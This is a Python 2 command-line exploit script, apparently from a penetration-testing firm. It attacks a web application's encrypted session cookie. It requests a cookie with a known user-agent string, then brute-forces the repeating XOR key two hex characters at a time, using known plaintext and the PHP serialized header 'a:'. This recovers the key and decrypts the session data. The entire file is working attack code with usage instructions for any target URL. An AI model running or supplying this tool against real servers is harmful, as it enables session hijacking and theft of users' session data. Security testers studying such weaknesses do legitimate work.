#!/usr/bin/python2
import base64
import itertools
import re
import string
import sys
import urllib
import urllib2

# Copyright (c) 2014 Robin Bailey @ Dionach Ltd.

# Usage: $ breakkey.py http://<<target>>

# Helper functions
def cleanstring(inputstring):
    ''' Replace all non-printable characters with dots to avoid breaking our terminal '''
    filter = ''.join([['.', chr(x)][chr(x) in string.printable[:-5]] for x in xrange(256)])
    return string.translate(inputstring, filter)

def sxor(s1, s2):
    ''' XOR two string '''
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def fullxor(string, key):
    ''' XOR a string with a repeated key '''
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in itertools.izip(string, itertools.cycle(key)))

def decode(key):
    ''' Decode the session with as much of the key as we have '''
    global HASH_LENGTH
    hashstring = "\x00" * HASH_LENGTH
    hashlist = list(hashstring)
    i = 0
    while (i < len(key)):
        hashlist[i] = key[i]
        i += 1
    hashstring = ''.join(hashlist)
    firstpass = fullxor(cookie, hashstring)
    session = ""
    i = 0
    while (i < len(firstpass)):
        session += sxor(firstpass[i], firstpass[i+1])
        i += 2
    return session

def getcookie(url):
    ''' Get cookie from server with our zzzz useragent '''
    if not url.startswith("http"):
        url = "http://" + url
    req = urllib2.Request(url)
    req.add_unredirected_header('User-Agent', 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz')
    response = urllib2.urlopen(req)
    headers = response.info()
    for key in headers:
        if key == "set-cookie":
            m = re.findall("([a-zA-Z0-9_\-]+)=([a-zA-Z0-9\+%=/._]+);", headers[key])
            for name, cookieurl in m:
                if len(cookieurl) < 100:
                    continue
                try:
                    cookieb64 = urllib.unquote(cookieurl)
                    cookie = base64.b64decode(cookieb64)
                    print("Found cookie - " + name)
                    return cookie
                except:
                    pass
    print("Error - could not get cookie")
    sys.exit(1)

def crack(key):
    ''' Recursively crack the key '''
    global HASH_LENGTH
    if len(key) >= HASH_LENGTH:
        session = decode(key)
        print("\n\nFound full key " + key + "\n" + cleanstring(session) + "\n\n")
        sys.exit(0)
    res = itertools.product('01234567890abcdef', repeat=2)
    for i in res:
        test = ''.join(i)
        sys.stdout.write(key + test + "\r")
        session = decode(key + test)
        m = re.search("z{" + str(len(key+test)/2) + "}", session)
        if m:
            print("Found key " + key + test + "\n" + cleanstring(session))
            crack(key+test)


# Get the cookie
try:
    target = sys.argv[1]
except:
    print("Usage: $ breakkey.py http://<target>")
    sys.exit(1)

cookie = getcookie(target)

# Length of the target hash in characters
# Should normally be 40 (sha1), but could be 32(md5)
HASH_LENGTH = 40
hashstring = "\x00" * HASH_LENGTH
key = ""

# Crack the first 4 characters
res = itertools.product('01234567890abcdef', repeat=4)
for i in res:
    test = ''.join(i)
    sys.stdout.write(test+"\r")
    session = decode(test)
    m = session.startswith("a:")
    if m:
        print("Found key " + test + "\n" + cleanstring(session))
        crack(test)
print("Could not find inital serialized header - server using mcrypt?")
